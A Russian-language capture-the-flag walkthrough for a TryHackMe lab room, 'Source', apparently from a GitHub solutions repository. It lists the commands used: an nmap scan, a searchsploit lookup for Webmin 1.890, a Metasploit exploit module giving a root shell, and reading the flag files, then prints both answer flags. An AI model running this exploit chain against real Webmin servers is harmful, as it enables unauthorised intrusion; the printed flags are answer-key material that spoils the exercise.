[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Source](https://tryhackme.com/r/room/source) 

Всего 1 заданиe:
## Задание 1
Перечислите и укорените ящик, прикрепленный к этой задаче. Можете ли вы обнаружить источник нарушения и использовать 
его, чтобы взять под контроль? 

Путешествие Екатерины на Dribbble

Эта виртуальная машина также включена в комнату AttackerKB как часть управляемого опыта. Кроме того, вы можете 
загрузить OVA Source для использования в автономном режиме с  https://www.darkstar7471.com/resources.html 

### Ответьте на вопросы ниже
пользователь.txt
```commandline
nmap -sV -sC -Pn <IP>
searchsploit webmin 1.890
msfconsole
search webmin
use 7
options
set LHOST tun0
set RHOSTS <IP>
exploit
id
cat /home/dark/user.txt
```
```commandline
THM{SUPPLY_CHAIN_COMPROMISE}
```
корень.txt
```commandline
cat /root/root.txt
```
```commandline
THM{UPDATE_YOUR_INSTALL}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)